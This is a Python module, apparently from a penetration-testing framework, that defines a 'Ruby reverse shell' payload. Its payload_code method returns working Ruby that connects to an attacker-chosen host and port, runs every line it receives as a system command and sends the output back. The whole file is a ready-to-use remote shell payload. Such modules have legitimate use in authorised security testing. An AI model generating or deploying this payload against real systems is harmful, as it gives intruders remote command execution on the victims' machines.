#!/usr/bin/env python3
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.

from lib.module import payload
from lib.module.payload import PayloadClass
from lib.module import safety
from lib.module import intrusiveness

import logging
logger = logging.getLogger(__name__)

class PayloadModule(PayloadClass):
    def __init__(self):
        super().__init__(**{
            'Name': 'Ruby reverse shell',
            'Description': "Spawn a reverse shell with Ruby",
            'Options': ["LHOST", "LPORT"],
            'payload': {
                "type": payload.TYPE_SHELL,
                'arch': payload.ARCH_RUBY,
            }
        })

    def payload_code(self, options):
        return """require 'socket'
s = TCPSocket.new '""" + options["LHOST"] + """', """ + options["LPORT"] + """
while line = s.gets
value = %x( #{line} )
s.puts value
end
s.close"""
